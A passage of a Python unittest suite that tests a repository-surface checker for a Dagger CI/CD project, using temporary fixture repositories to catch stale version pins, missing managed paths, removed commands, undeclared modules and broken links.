"""
Regression tests for the defended repository surface (scripts/repo_surface.py).

Every test builds a throwaway repository in a temp directory, so nothing here
depends on the state of the real working tree. That matters: the real tree still
carries active drift that a later brief repairs, and a checker must be provable
independently of whether today's repository happens to be clean.

The suite is written against the four failure modes that actually shipped:

  * a managed path in the inventory that no longer exists — the deleted
    templates/azure-devops/commit-archive.yml entry, which `if not
    path.exists(): continue` turned into a pass;
  * a document calling `run-archive` on a commit composite that no longer
    exports it;
  * a module directory that exists but is declared nowhere (or is declared and
    does not exist);
  * a pin left behind at an older version while the rest of the repository moved.

It also pins the negative direction — a checker that passes a clean fixture, an
empty inventory that is refused rather than silently satisfied, and consumer
examples that must NOT be flagged — because a checker that always fails, or one
that accepts nothing, defends nothing either.
"""
from __future__ import annotations

import json
import pathlib
import re
import subprocess
import sys
import tempfile
import unittest

SCRIPTS = pathlib.Path(__file__).resolve().parent.parent
REPO_ROOT = SCRIPTS.parent
sys.path.insert(0, str(SCRIPTS))

from repo_surface import (  # noqa: E402
    GUARD_LOOKBACK_LINES,
    PIN_REWRITE_PATTERNS,
    STEP_RUN_BUDGET_BYTES,
    InventoryError,
    _run_block_bodies,
    _run_inline_commands,
    check_all,
    check_dagger_commands,
    check_include_language_set,
    check_declared_paths_exist,
    check_local_links,
    check_module_inventory,
    check_pending_pin_repairs,
    CHECKS,
    check_pin_consistency,
    check_smoke_scripts_are_wired,
    check_cross_module_develop,
    check_cicd_refs_are_versions,
    check_composite_params_reachable,
    check_change_diff_not_swallowed,
    check_superseded_runs,
    check_first_check_gates,
    check_guarded_flags,
    dagger_flag_name,
    check_synced_files,
    check_generated_files,
    check_schema_version_coherence,
    check_undeclared_markdown,
    check_workflow_actions_trusted,
    check_workflow_output_chain,
    check_pr_comment_upsert,
    check_sast_default_wording,
    check_workflow_step_sizes,
    check_run_expressions,
    kebab_to_method,
    load_inventory,
    PRECOMMIT_CALLERS,
    logical_lines,
)

# A behavioural smoke plus the runner and the CI step that invoke it. All three
# halves are in the fixture so the baseline is a repository where they agree —
# a fixture with the smoke and no wiring would make the check pass by having
# nothing to look at.
SMOKE_SCRIPT = """#!/usr/bin/env bash
set -uo pipefail
echo "behavioural fixture smoke"
"""

SMOKE_RUNNER_SH = """#!/usr/bin/env bash
# Runner. The prose below names a smoke deliberately: a check satisfied by a
# comment mention would measure documentation, not what `make smoke` runs.
# See scripts/smoke/orphan-shapes.sh for the shape this does NOT run.
set -uo pipefail
SMOKES=(
  "stage-orchestrators.sh"
)
for entry in "${SMOKES[@]}"; do
  bash "scripts/smoke/${entry%% *}"
done
"""

SMOKE_CI_JOB = """
  smoke:
    runs-on: ubuntu-latest
    steps:
      - name: Behavioural smoke
        run: bash scripts/smoke/stage-orchestrators.sh
"""

FIXTURE_VERSION = "9.9.9"

# A commit composite with the unified entry point only: Run exists, RunArchive
# does not. This is the post-ADR-005 shape every active document must describe.
COMMIT_MAIN_GO = """package main

import (
\t"context"

\t"dagger/commit/internal/dagger"
)

type Commit struct{}

// The signature is multi-line and carries a second parameter on purpose: it is
// the shape every composite in this repository is written in, and it is the
// only shape check_composite_params_reachable can read. A fixture with a
// one-line signature would make that check report its own blindness against the
// clean baseline, which is the opposite of what the baseline is for.
func (m *Commit) Run(
\tctx context.Context,
\tsrc *dagger.Directory,
\tlicenseGate string,
) (*dagger.Directory, error) {
\t_ = licenseGate
\treturn src, nil
}
"""

QUALITY_MAIN_GO = """package main

import (
\t"context"

\t"dagger/quality/internal/dagger"
)

type Quality struct{}

func (m *Quality) Check(ctx context.Context, src *dagger.Directory) (*dagger.File, error) {
\treturn nil, nil
}
"""


def _pin(module: str, version: str = FIXTURE_VERSION) -> str:
    return f"github.com/context-and-oss/cicd/{module}@v{version}"


# A first check as README.md and the tutorial teach it: the export chained to
# the jq gate on the file it wrote.
FIRST_CHECK_BLOCK = (
    "```bash\n"
    f"dagger -m {_pin('src/composites/commit')} call run \\\n"
    "  --src . \\\n"
    "  export --path ./evidence.json &&\n"
    "jq -e '.passed == true' ./evidence.json > /dev/null\n"
    "```\n"
)


def _ci_jobs(text: str) -> dict[str, str]:
    """Split a workflow into {job-name: job-body}.

    Textual, not YAML: PyYAML is not guaranteed on a bare runner (the shipped
    scripts deliberately use json only). Job keys are the 2-space-indented
    identifiers that follow the top-level `jobs:` mapping.
    """
    jobs: dict[str, list[str]] = {}
    current: str | None = None
    in_jobs = False
    for line in text.splitlines():
        if re.fullmatch(r"jobs:\s*", line):
            in_jobs = True
            continue
        if not in_jobs:
            continue
        if re.fullmatch(r"\S.*", line):  # back to column 0 — jobs block ended
            break
        header = re.fullmatch(r"  ([A-Za-z0-9_-]+):\s*", line)
        if header:
            current = header.group(1)
            jobs[current] = []
        elif current is not None:
            jobs[current].append(line)
    return {name: "\n".join(body) for name, body in jobs.items()}


def _ci_matrix_modules(text: str) -> list[str]:
    """The `module:` list of module-test's build matrix."""
    body = _ci_jobs(text)["module-test"]
    marker = re.search(r"^\s*module:\s*$", body, re.M)
    assert marker, "module-test has no matrix `module:` list"
    modules = []
    for line in body[marker.end() :].lstrip("\n").splitlines():
        item = re.fullmatch(r"\s*- (\S+)\s*", line)
        if not item:
            break
        modules.append(item.group(1))
    return modules


INCLUDE_GO = """package main

var canonicalLanguages = []string{"go", "node", "python", "dotnet"}

var languageAliases = map[string]string{
	"go":     "go",
	"node":   "node",
	"python": "python",
	"dotnet": "dotnet",
}
"""

# The PR verdict step, in the shape check_pr_comment_upsert requires: it finds
# the comment carrying notify's marker and PATCHes it, falling back to a create.
# Two workflows carry it byte-identically, because a reusable workflow cannot
# source it from scripts/ci/ — so the baseline is a repository where the copies
# agree, and each test below breaks exactly one of the two rules.
PR_COMMENT_STEP = """
      - name: Post PR comment
        run: |
          marker="$(head -n 1 ./audit-evidence/comment.md)"
          id="$(gh api "repos/$REPO/issues/$PR/comments" | jq -r 'first(.[].id)')"
          if [ -n "$id" ]; then
            gh api -X PATCH "repos/$REPO/issues/comments/$id" --input -
          else
            gh pr comment "$PR" --body-file ./audit-evidence/comment.md
          fi
"""

PRECOMMIT_INCLUDE_GUARD = """jobs:
  precommit:
    steps:
      - uses: actions/checkout@v4
      - run: |
          for _l in "${_langs[@]}"; do
            case "$_l" in
              go|node|python|dotnet) ;;
              *) echo "::error::include: '$_l' is not a language cicd can scan."; exit 1 ;;
            esac
          done
"""


PRECOMMIT_CALLER = (
    "on:\n  pull_request:\n\n"
    "concurrency:\n"
    "  group: ${{ github.workflow }}-${{ github.event_name == 'pull_request' && "
    "format('pr-{0}', github.event.pull_request.number) || github.run_id }}\n"
    "  cancel-in-progress: ${{ github.event_name == 'pull_request' }}\n\n"
    "jobs:\n  precommit:\n    runs-on: ubuntu-latest\n"
)


class SurfaceFixture:
    """A minimal, coherent repository plus the inventory that declares it.

    Tests mutate one thing and assert one named failure, so each test documents a
    single drift class rather than a soup of them.
    """

    def __init__(self, root: pathlib.Path) -> None:
        self.root = root
        self.inventory: dict = {
            "version": 1,
            "modules": ["src/composites/commit", "src/quality"],
            "schema_modules": ["src/quality"],
            "schema_synced_modules": ["src/quality"],
            "contract_modules": ["src/quality"],
            "active_surfaces": {
                "root_instructions": ["README.md", "CLAUDE.md"],
                "module_docs": ["src/composites/commit/README.md", "src/quality/README.md"],
                "diataxis_docs": [
                    "docs/index.md",
                    "docs/how-to-guides/use-the-pipeline.md",
                    "docs/tutorials/getting-started.md",
                ],
                "templates": ["templates/github-actions/commit.yml"],
                "reusable_workflows": [".github/workflows/commit.yml"],
            },
            "pin_rewrite": {
                "default_scope_groups": ["root_instructions", "module_docs", "diataxis_docs", "templates"],
                "workflow_scope_groups": ["reusable_workflows"],
            },
            "composite_reach": {
                "surface_groups": ["templates", "reusable_workflows"],
                "unreachable": [],
                "unreadable_sites": [],
            },
            # A flag that switches on an optional outbound channel. The baseline
            # carries it guarded in both surfaces, so the tests below can break
            # exactly one guard and assert one named failure.
            "guarded_flags": {
                "surface_groups": ["templates", "reusable_workflows"],
                "flags": [
                    {
                        "flag": "teams-webhook",
                        "variable": "TEAMS_WEBHOOK",
                        "reason": "opt-in channel; unset it still reaches the composite",
                    }
                ],
            },
            "workflow_actions": {
                "trusted_owners": ["actions"],
                "third_party_allowed": [],
                "workflow_groups": ["reusable_workflows"],
            },
            "historical_exclusions": [
                {"path": "docs/history", "reason": "dated planning notes from delivered work"}
            ],
            "discovery": {
                "module_root": "src",
                "module_marker": "dagger.json",
                "markdown_roots": [
                    {"path": ".", "recursive": False},
                    {"path": "docs", "recursive": True},
                    {"path": "src", "recursive": True},
                ],
            },
        }

        self.write("src/composites/commit/dagger.json", '{"name": "commit", "sdk": "go"}\n')
        self.write("src/composites/commit/main.go", COMMIT_MAIN_GO)
        self.write("src/quality/dagger.json", '{"name": "quality", "sdk": "go"}\n')
        self.write("src/quality/main.go", QUALITY_MAIN_GO)
        self.write("src/quality/schema.go", 'package main\n\nconst SchemaVersion = "1.1.0"\n')
        self.write(
            "src/quality/contract.json",
            '{"step": "src/quality", "outputSchema": "evidence-1"}\n',
        )
        self.write(
            "src/internal/evidence/schema.go",
            'package evidence\n\nconst SchemaVersion = "1.1.0"\n',
        )
        self.write(
            "src/internal/evidence/schema.json",
            json.dumps(
                {
                    "$defs": {
                        "evidence-envelope-v1": {
                            "type": "object",
                            "properties": {"schemaVersion": {"type": "string", "const": "1.1.0"}},
                        }
                    }
                },
                indent=2,
            )
            + "\n",
        )
        self.write(
            "src/cross-cutting/contract/verify.go",
            "package main\n\nvar validOutputSchemas = map[string]bool{\n"
            '\t"evidence-1":   true,\n'
            '\t"evidence-1[]": true,\n'
            '\t"none":         true,\n'
            "}\n",
        )

        self.write(
            "README.md",
            "# cicd\n\nSee [the docs](docs/index.md).\n\n"
            f"    dagger -m {_pin('src/composites/commit')} call run --src .\n\n"
            + FIRST_CHECK_BLOCK,
        )
        self.write("docs/tutorials/getting-started.md", "# Getting started\n\n" + FIRST_CHECK_BLOCK)
        self.write(
            "CLAUDE.md",
            "# Codebase guide\n\n```sh\ndagger -m ./src/composites/commit call run \\\n"
            "  --src ./testdata/go-app\n```\n",
        )
        self.write("src/composites/commit/README.md", f"# commit\n\n`{_pin('src/composites/commit')}`\n")
        self.write("src/quality/README.md", f"# quality\n\n`{_pin('src/quality')}`\n")
        self.write("docs/index.md", "# Docs\n\n- [Use the pipeline](how-to-guides/use-the-pipeline.md)\n")
        self.write(
            "docs/how-to-guides/use-the-pipeline.md",
            "# Use the pipeline\n\nBack to [the index](../index.md).\n\n"
            f"```sh\ndagger -m {_pin('src/composites/commit')} call run --src .\n```\n",
        )
        self.write(
            "templates/github-actions/commit.yml",
            "jobs:\n  commit:\n    steps:\n      - run: |\n"
            "          extra=()\n"
            '          if [ -n "${TEAMS_WEBHOOK:-}" ]; then extra+=(--teams-webhook env:TEAMS_WEBHOOK); fi\n'
            f"          dagger -m {_pin('src/composites/commit')} call run --src . \\\n"
            "            --license-gate \"$LICENSE_GATE\" \"${extra[@]}\"\n",
        )
        # A reusable workflow with a coherent output chain (workflow_call output
        # → job output → step write into $GITHUB_OUTPUT), so the baseline proves
        # check_workflow_output_chain passes a chain that resolves — the tests
        # that break one link at a time would otherwise prove nothing.
        self.write(
            ".github/workflows/commit.yml",
            # An exact version, not `@v1`. This repository publishes no moving
            # major tag — all 83 of its tags are full vX.Y.Z — so `@v1` is a
            # reference nothing can resolve, and check_cicd_refs_are_versions
            # refuses it. The fixture models a repository that does the right
            # thing; the wrong thing is asserted on in CicdRefShapeTests.
            "# Call it as:\n"
            f"#   uses: context-and-oss/cicd/.github/workflows/commit.yml@v{FIXTURE_VERSION}\n"
            "on:\n"
            "  workflow_call:\n"
            "    outputs:\n"
            "      evidence-artifact:\n"
            "        description: Pure expression with no job output behind it.\n"
            "        value: evidence-${{ github.sha }}\n"
            "      passed:\n"
            "        description: Combined verdict from the gate step.\n"
            "        value: ${{ jobs.commit.outputs.passed }}\n"
            "jobs:\n  commit:\n"
            "    outputs:\n"
            "      passed: ${{ steps.gate.outputs.passed }}\n"
            "    steps:\n      - uses: actions/checkout@v4\n"
            "      - run: |\n"
            "          extra=()\n"
            '          if [ -n "${TEAMS_WEBHOOK:-}" ]; then extra+=(--teams-webhook env:TEAMS_WEBHOOK); fi\n'
            f"          dagger -m {_pin('src/composites/commit')} call run --src . \\\n"
            "            --license-gate \"$LICENSE_GATE\" \"${extra[@]}\"\n"
            "      - name: Gate on evidence\n"
            "        id: gate\n"
            "        run: |\n"
            '          echo "passed=false" >> "$GITHUB_OUTPUT"\n'
            '          echo "passed=true" >> "$GITHUB_OUTPUT"\n',
        )

        # The --include accepted set, carried in the module and re-checked by a
        # shell guard in the pre-commit reusable. Both halves are in the fixture so
        # the baseline is a repository where they agree; a test that removed one to
        # make the check pass would be asserting the check cannot look.
        self.write("src/quality/include.go", INCLUDE_GO)
        self.write(".github/workflows/precommit.yml", PRECOMMIT_INCLUDE_GUARD)
        self.append(".github/workflows/commit.yml", PR_COMMENT_STEP)
        self.inventory["active_surfaces"]["reusable_workflows"].append(
            ".github/workflows/dogfood.yml"
        )
        self.write(".github/workflows/dogfood.yml", "jobs:\n  d:\n    steps:" + PR_COMMENT_STEP)

        # The behavioural smoke and both of its wirings.
        self.write("scripts/smoke/stage-orchestrators.sh", SMOKE_SCRIPT)
        self.write("scripts/smoke-all.sh", SMOKE_RUNNER_SH)
        self.append(".github/workflows/commit.yml", SMOKE_CI_JOB)

        # The pre-commit callers that must cancel a superseded PR run.
        self.write("templates/github-actions/precommit.yml", PRECOMMIT_CALLER)
        self.write(".github/workflows/dogfood-precommit.yml", PRECOMMIT_CALLER)

    def write(self, rel: str, text: str) -> pathlib.Path:
        path = self.root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        return path

    def read(self, rel: str) -> str:
        return (self.root / rel).read_text()

    def append(self, rel: str, text: str) -> None:
        (self.root / rel).write_text((self.root / rel).read_text() + text)

    def surface(self, group: str) -> list:
        return self.inventory["active_surfaces"][group]

    def inventory_path(self) -> pathlib.Path:
        path = self.root / "scripts" / "repo-inventory.json"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(self.inventory, indent=2))
        return path

    def load(self):
        return load_inventory(self.inventory_path(), self.root)

    def run_cli(self) -> subprocess.CompletedProcess:
        return subprocess.run(
            [
                sys.executable,
                str(SCRIPTS / "check-repo-surface.py"),
                "--root",
                str(self.root),
                "--inventory",
                str(self.inventory_path()),
            ],
            capture_output=True,
            text=True,
            check=False,
        )

    def run_modules_cli(self) -> subprocess.CompletedProcess:
        """The exact surface CI and both release workflows invoke to prove
        "all modules" before they consume the manifest."""
        return subprocess.run(
            [
                sys.executable,
                str(SCRIPTS / "check-repo-surface.py"),
                "--modules",
                "--root",
                str(self.root),
                "--inventory",
                str(self.inventory_path()),
            ],
            capture_output=True,
            text=True,
            check=False,
        )

    def run_pins_cli(self) -> subprocess.CompletedProcess:
        return subprocess.run(
            [
                sys.executable,
                str(SCRIPTS / "check-workflow-pins.py"),
                "--root",
                str(self.root),
                "--inventory",
                str(self.inventory_path()),
            ],
            capture_output=True,
            text=True,
            check=False,
        )


class FixtureTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.fx = SurfaceFixture(pathlib.Path(self._tmp.name))

    def assertProblem(self, problems: list[str], *needles: str) -> None:
        """Assert exactly one problem, mentioning every needle."""
        self.assertEqual(1, len(problems), f"expected one problem, got: {problems}")
        for needle in needles:
            self.assertIn(needle, problems[0])


class BaselineFixtureTests(FixtureTestCase):
    """A coherent repository must pass, or every failure below proves nothing."""

    def test_clean_fixture_passes_every_check(self) -> None:
        for name, problems in check_all(self.fx.load()):
            self.assertEqual([], problems, f"clean fixture failed check '{name}'")

    def test_cli_exits_zero_on_clean_fixture(self) -> None:
        result = self.fx.run_cli()
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertIn("OK", result.stdout)

    def test_pins_cli_exits_zero_on_clean_fixture(self) -> None:
        result = self.fx.run_pins_cli()
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertIn("OK", result.stdout)


class MissingManagedPathTests(FixtureTestCase):
    """scenario: missing-managed-path-fails."""

    def test_declared_path_that_does_not_exist_is_named(self) -> None:
        self.fx.surface("diataxis_docs").append("docs/how-to-guides/never-written.md")
        problems = check_declared_paths_exist(self.fx.load())
        self.assertProblem(problems, "missing managed path", "docs/how-to-guides/never-written.md")

    def test_deleted_commit_archive_template_entry_is_named(self) -> None:
        """The exact historical pattern: an inventory entry outliving the file.

        templates/azure-devops/commit-archive.yml was deleted when the archive
        shape became `commit run --artifact archive`, but the entry stayed in the
        managed list and every consumer answered `if not path.exists(): continue`.
        """
        self.fx.surface("templates").append("templates/azure-devops/commit-archive.yml")
        problems = check_declared_paths_exist(self.fx.load())
        self.assertProblem(
            problems, "missing managed path", "templates/azure-devops/commit-archive.yml"
        )

    def test_directory_declared_as_a_surface_is_named(self) -> None:
        (self.fx.root / "docs" / "reference").mkdir(parents=True)
        self.fx.surface("diataxis_docs").append("docs/reference")
        problems = check_declared_paths_exist(self.fx.load())
        self.assertProblem(problems, "not a file", "docs/reference")

    def test_missing_path_makes_the_cli_fail(self) -> None:
        self.fx.surface("templates").append("templates/azure-devops/commit-archive.yml")
        result = self.fx.run_cli()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("templates/azure-devops/commit-archive.yml", result.stderr)


class RemovedCommandTests(FixtureTestCase):
    """scenario: removed-command-fails."""

    def test_local_run_archive_call_names_command_and_module(self) -> None:
        """The exact historical pattern: `run-archive` on the commit composite."""
        self.fx.write(
            "docs/how-to-guides/use-the-pipeline.md",
            "# Use the pipeline\n\n```sh\ndagger -m ./src/composites/commit call run-archive \\\n"
            "  --src ./testdata/node-app \\\n  --build-cmd 'npm run build'\n```\n",
        )
        problems = check_dagger_commands(self.fx.load())
        self.assertProblem(problems, "run-archive", "src/composites/commit", "RunArchive")

    def test_pinned_run_archive_call_names_command_and_module(self) -> None:
        self.fx.append(
            ".github/workflows/commit.yml",
            f"          dagger -m {_pin('src/composites/commit')} call run-archive --src .\n",
        )
        problems = check_dagger_commands(self.fx.load())
        self.assertProblem(problems, "run-archive", "src/composites/commit", "RunArchive")

    def test_call_split_across_continuation_lines_is_still_checked(self) -> None:
        """A per-physical-line scan would skip this silently."""
        self.fx.append(
            "CLAUDE.md",
            "\n```sh\ndagger \\\n  -m ./src/composites/commit \\\n  call run-archive \\\n"
            "  --src .\n```\n",
        )
        problems = check_dagger_commands(self.fx.load())
        self.assertProblem(problems, "run-archive", "src/composites/commit")

    def test_reference_to_a_module_path_that_does_not_exist_is_named(self) -> None:
        self.fx.append(
            "CLAUDE.md",
            f"\n```sh\ndagger -m {_pin('src/composites/archive')} call run --src .\n```\n",
        )
        problems = check_dagger_commands(self.fx.load())
        self.assertProblem(problems, "unknown module path", "src/composites/archive")

    def test_existing_command_is_accepted(self) -> None:
        self.fx.append("CLAUDE.md", "\n```sh\ndagger -m ./src/quality call check --src .\n```\n")
        self.assertEqual([], check_dagger_commands(self.fx.load()))

    def test_consumer_module_reference_is_left_alone(self) -> None:
        """`-m ./ci call pr-gate` is the reader's own module, not ours."""
        self.fx.append("docs/index.md", "\n```sh\ndagger -m ./ci call pr-gate --src .\n```\n")
        self.assertEqual([], check_dagger_commands(self.fx.load()))

    def test_kebab_to_method_matches_dagger_name_mangling(self) -> None:
        self.assertEqual("RunArchive", kebab_to_method("run-archive"))
        self.assertEqual("ScanSource", kebab_to_method("scan-source"))
        self.assertEqual("Run", kebab_to_method("run"))

    def test_logical_lines_report_the_first_physical_line(self) -> None:
        joined = logical_lines("one\ntwo \\\n  three\nfour\n")
        self.assertEqual([(1, "one"), (2, "two three"), (4, "four")], joined)


class ModuleDiscoveryTests(FixtureTestCase):
    """scenario: module-discovery-agrees."""

    def test_clean_fixture_agrees_in_both_directions(self) -> None:
        self.assertEqual([], check_module_inventory(self.fx.load()))

    def test_module_on_disk_but_not_declared_is_named(self) -> None:
        self.fx.write("src/cross-cutting/intent/dagger.json", '{"name": "intent"}\n')
        problems = check_module_inventory(self.fx.load())
        self.assertProblem(problems, "undeclared Dagger module", "src/cross-cutting/intent")

    def test_module_declared_but_absent_from_disk_is_named(self) -> None:
        self.fx.inventory["modules"].append("src/cross-cutting/pages")
        problems = check_module_inventory(self.fx.load())
        self.assertProblem(problems, "declared module has no dagger.json", "src/cross-cutting/pages")

    def test_module_declared_twice_is_named(self) -> None:
        self.fx.inventory["modules"].append("src/quality")
        problems = check_module_inventory(self.fx.load())
        self.assertProblem(problems, "declared more than once", "src/quality")

    def test_schema_module_without_schema_file_is_named(self) -> None:
        self.fx.inventory["schema_modules"].append("src/composites/commit")
        problems = check_module_inventory(self.fx.load())
        self.assertProblem(problems, "schema_modules", "src/composites/commit", "schema.go is missing")

    def test_synced_module_outside_schema_modules_is_named(self) -> None:
        self.fx.write("src/composites/commit/schema.go", "package main\n")
        self.fx.inventory["schema_synced_modules"].append("src/composites/commit")
        problems = check_module_inventory(self.fx.load())
        self.assertEqual(2, len(problems), problems)
        self.assertTrue(any("not in schema_modules" in p for p in problems), problems)
        self.assertTrue(any("undeclared schema.go" in p for p in problems), problems)

    def test_undeclared_schema_copy_is_named(self) -> None:
        self.fx.write("src/composites/commit/schema.go", "package main\n")
        problems = check_module_inventory(self.fx.load())
        self.assertProblem(problems, "undeclared schema.go", "src/composites/commit", "sync-schema")

    def test_undeclared_step_contract_is_named(self) -> None:
        self.fx.write("src/composites/commit/contract.json", "{}\n")
        problems = check_module_inventory(self.fx.load())
        self.assertProblem(
            problems, "undeclared contract.json", "src/composites/commit", "verify-contracts"
        )

    def test_subset_naming_a_non_module_is_named(self) -> None:
        self.fx.inventory["contract_modules"].append("src/internal/evidence")
        problems = check_module_inventory(self.fx.load())
        self.assertProblem(problems, "contract_modules", "not a declared module")

    def test_modules_cli_passes_a_clean_fixture(self) -> None:
        """`--modules` is the command CI and both release workflows run before
        they loop over the manifest, so pin its exit status, not just the
        underlying function."""
        result = self.fx.run_modules_cli()
        self.assertEqual(0, result.returncode, result.stdout + result.stderr)
        self.assertIn("module inventory check: OK", result.stdout)

    def test_modules_cli_rejects_a_deliberately_unlisted_module(self) -> None:
        """The release path drives "all modules" off the manifest. A module on
        disk that the manifest omits would therefore be released unverified —
        the guard command must exit non-zero and name it."""
        self.fx.write("src/cross-cutting/pages/dagger.json", '{"name": "pages"}\n')
        result = self.fx.run_modules_cli()
        self.assertEqual(1, result.returncode, result.stdout + result.stderr)
        combined = result.stdout + result.stderr
        self.assertIn("undeclared Dagger module", combined)
        self.assertIn("src/cross-cutting/pages", combined)


class PinConsistencyTests(FixtureTestCase):
    def test_stale_cicd_pin_in_a_module_readme_is_named(self) -> None:
        """Module READMEs were outside the old managed list and froze at v1.0.0."""
        self.fx.write("src/quality/README.md", f"# quality\n\n`{_pin('src/quality', '1.0.0')}`\n")
        problems = check_pin_consistency(self.fx.load())
        self.assertTrue(problems, "stale pin was not reported")
        self.assertIn("pin version skew", problems[0])
        self.assertIn(f"v{FIXTURE_VERSION}", problems[0])
        self.assertTrue(any("src/quality/README.md:3" in p and "v1.0.0" in p for p in problems), problems)

    def test_stale_reusable_workflow_pin_is_named(self) -> None:
        """.github/workflows/ froze at v0.2.0 because the bumper never pushed it."""
        self.fx.write(
            ".github/workflows/commit.yml",
            "jobs:\n  commit:\n    steps:\n      - uses: "
            "context-and-oss/cicd/.github/workflows/commit.yml@v0.2.0\n",
        )
        problems = check_pin_consistency(self.fx.load())
        self.assertTrue(any(".github/workflows/commit.yml" in p and "v0.2.0" in p for p in problems), problems)

    def test_stale_composite_action_pin_is_named(self) -> None:
        """The how-to guides pin .github/actions/install-dagger; a shape the reader
        skips is a pin that never moves and never reads as stale."""
        self.fx.append(
            "docs/index.md",
            "\n      - uses: context-and-oss/cicd/.github/actions/install-dagger@v0.2.0\n",
        )
        problems = check_pin_consistency(self.fx.load())
        self.assertTrue(any("docs/index.md" in p and "v0.2.0" in p for p in problems), problems)

    def test_the_bumper_rewrites_a_composite_action_pin(self) -> None:
        line = "uses: context-and-oss/cicd/.github/actions/install-dagger@v0.2.0"
        for pat, repl in PIN_REWRITE_PATTERNS:
            line = pat.sub(repl.format(v="9.9.9"), line)
        self.assertEqual("uses: context-and-oss/cicd/.github/actions/install-dagger@v9.9.9", line)

    def test_stale_ado_repository_resource_pin_is_named(self) -> None:
        self.fx.append(
            "docs/index.md",
            "\nresources:\n  repositories:\n    - repository: cicdTemplates\n"
            "      type: github\n      name: context-and-oss/cicd\n"
            "      endpoint: example-connection\n      ref: refs/tags/v0.1.0\n",
        )
        problems = check_pin_consistency(self.fx.load())
        self.assertTrue(any("docs/index.md" in p and "v0.1.0" in p for p in problems), problems)

    def test_bumper_rewrites_only_the_cicd_resource_tag(self) -> None:
        text = (
            "      name: 'context-and-oss/cicd'\n"
            "      endpoint: example-connection\n      ref: 'refs/tags/v0.1.0'\n"
            "      name: example-org/shared-models\n      ref: refs/tags/v0.1.0\n"
        )
        for pat, repl in PIN_REWRITE_PATTERNS:
            text = pat.sub(repl.format(v="9.9.9"), text)
        self.assertIn("ref: 'refs/tags/v9.9.9'", text)
        self.assertIn("name: example-org/shared-models\n      ref: refs/tags/v0.1.0", text)

    def test_resource_match_does_not_cross_to_another_repository(self) -> None:
        self.fx.append(
            "docs/index.md",
            "\n      name: context-and-oss/cicd\n"
            "    - repository: another\n      name: example-org/shared-models\n"
            "      ref: refs/tags/v0.1.0\n",
        )
        self.assertEqual([], check_pin_consistency(self.fx.load()))

    def test_unrelated_third_party_pin_is_left_alone(self) -> None:
        self.fx.append("docs/index.md", "\nExample: `github.com/acme/shared-models@v1.2.3`\n")
        self.assertEqual([], check_pin_consistency(self.fx.load()))


class PinGuardTests(FixtureTestCase):
    """The CI-blocking gate (check-workflow-pins.py) tolerates exactly the pins
    and command forms listed as pending, and nothing else — this is the split
    that lets check-repo-surface.py widen scope without also breaking ci.yml
    and cd.yml before a later brief repairs the newly caught drift.
    """

    def _tolerate(self, path: str, reason: str = "module README outside the old TARGETS list") -> None:
        self.fx.inventory["pin_guard"] = {"pending_repairs": [{"path": path, "reason": reason}]}

    def test_pending_pin_is_tolerated_only_when_asked(self) -> None:
        self.fx.write("src/quality/README.md", f"# quality\n\n`{_pin('src/quality', '1.0.0')}`\n")
        self._tolerate("src/quality/README.md")
        inv = self.fx.load()
        self.assertEqual([], check_pin_consistency(inv, tolerate_pending=True))
        self.assertTrue(check_pin_consistency(inv, tolerate_pending=False))
        self.assertTrue(check_pin_consistency(inv))  # default is untolerant

    def test_local_run_archive_call_is_hidden_from_the_ci_gates_narrower_scope(self) -> None:
        """CLAUDE.md:120's exact historical pattern: caught by the canonical
        checker, invisible to the gate that only resolves pinned remote calls.
        """
        self.fx.append("docs/index.md", "\n```sh\ndagger -m ./src/composites/commit call run-archive\n```\n")
        inv = self.fx.load()
        self.assertTrue(check_dagger_commands(inv, resolve_local=True))
        self.assertEqual([], check_dagger_commands(inv, resolve_local=False))

    def test_ci_gate_stays_green_against_drift_the_canonical_checker_rejects(self) -> None:
        """The exact shape of the live repository today: a tolerated stale pin
        plus a local run-archive call. The canonical checker must reject both;
        the CI-blocking gate must stay green regardless.
        """
        self.fx.write("src/quality/README.md", f"# quality\n\n`{_pin('src/quality', '1.0.0')}`\n")
        self.fx.append("docs/index.md", "\n```sh\ndagger -m ./src/composites/commit call run-archive\n```\n")
        self._tolerate("src/quality/README.md")

        surface_result = self.fx.run_cli()
        self.assertEqual(1, surface_result.returncode, surface_result.stdout)
        self.assertIn("v1.0.0", surface_result.stderr)
        self.assertIn("run-archive", surface_result.stderr)

        pins_result = self.fx.run_pins_cli()
        self.assertEqual(0, pins_result.returncode, pins_result.stderr)

    def test_stale_pending_repair_entry_is_named(self) -> None:
        """An entry that no longer excuses anything must not survive silently —
        that is the same silent-skip failure mode this module exists to remove.
        """
        self._tolerate("src/quality/README.md")  # pin is NOT actually stale here
        problems = check_pending_pin_repairs(self.fx.load())
        self.assertTrue(problems, "a no-longer-needed pending repair was not flagged")
        self.assertIn("src/quality/README.md", problems[0])
        self.assertIn("no longer lags", problems[0])

    def test_genuinely_lagging_pending_repair_entry_is_not_flagged(self) -> None:
        self.fx.write("src/quality/README.md", f"# quality\n\n`{_pin('src/quality', '1.0.0')}`\n")
        self._tolerate("src/quality/README.md")
        self.assertEqual([], check_pending_pin_repairs(self.fx.load()))

    def test_pending_repairs_entry_naming_an_undeclared_path_is_refused(self) -> None:
        self._tolerate("docs/does-not-exist.md")
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("not a declared active surface", str(ctx.exception))

    def test_pending_repairs_entry_without_a_reason_is_refused(self) -> None:
        self.fx.inventory["pin_guard"] = {
            "pending_repairs": [{"path": "src/quality/README.md"}]
        }
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("needs a 'reason'", str(ctx.exception))

    def test_duplicate_pending_repairs_entry_is_refused(self) -> None:
        self.fx.inventory["pin_guard"] = {
            "pending_repairs": [
                {"path": "src/quality/README.md", "reason": "one"},
                {"path": "src/quality/README.md", "reason": "two"},
            ]
        }
        with self.assertRaises(InventoryError) as ctx:
            self.fx.load()
        self.assertIn("more than once", str(ctx.exception))


class LocalLinkTests(FixtureTestCase):
    def test_broken_relative_link_is_named(self) -> None:
        self.fx.append("docs/index.md", "\nSee [the risk module](../risk/README.md).\n")
        problems = check_local_links(self.fx.load())
        self.assertProblem(problems, "broken local link", "../risk/README.md", "docs/index.md")

    def test_broken_root_relative_link_is_named(self) -> None:
